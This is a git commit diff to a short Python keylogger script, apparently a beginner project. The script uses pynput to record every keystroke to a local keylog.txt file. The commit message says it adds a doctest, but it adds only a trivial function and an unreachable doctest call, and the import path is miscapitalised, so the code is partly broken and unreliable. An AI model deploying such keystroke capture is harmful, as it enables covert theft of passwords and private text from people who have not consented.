012bbf6153324997e2aaf8184ea46d465c7c1844
SUHAS M <65087769+suhasmj@users.noreply.github.com>
2021-10-14 20:34:49 +0530

    added doctest for the function used and type hint

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,21 @@
 from pynput.Keyboard import Listener
 
+
 def writeofile(key):
     keydata = str(key)
     keydata = keydata.replace("'","")
     with open("keylog.txt","a") as f:
         f.write(keydata)
     #return none
-#this function will record keystrokes in log.txt
+    #def function() -> None
+    #this function will record keystrokes in log.txt
 
 with Listener(on_press = writeofile) as l:
     l.join()
+
+def typeHint(key: str) -> str:
+    return key
+
+if __name__ == "__main__":
+    import doctest
+    doctest.testmod()
